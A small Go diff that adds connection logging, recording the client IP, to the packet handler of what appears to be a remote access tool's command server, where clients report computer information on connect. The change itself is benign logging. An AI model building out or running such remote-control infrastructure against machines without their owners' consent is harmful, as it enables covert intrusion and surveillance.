@@ -4,6 +4,7 @@ import (
 	"encoding/gob"
 	"fmt"
 	"io"
+	"rat/command/log"
 	"rat/shared"
 )
 
@@ -35,6 +36,7 @@ func (packet ComputerInfoPacket) Read(r io.ReadWriter, c *Client) error {
 
 	if !c.Authenticated {
 		add(c)
+		log.Println("connect", c.GetIP())
 		c.Authenticated = true
 	}
 
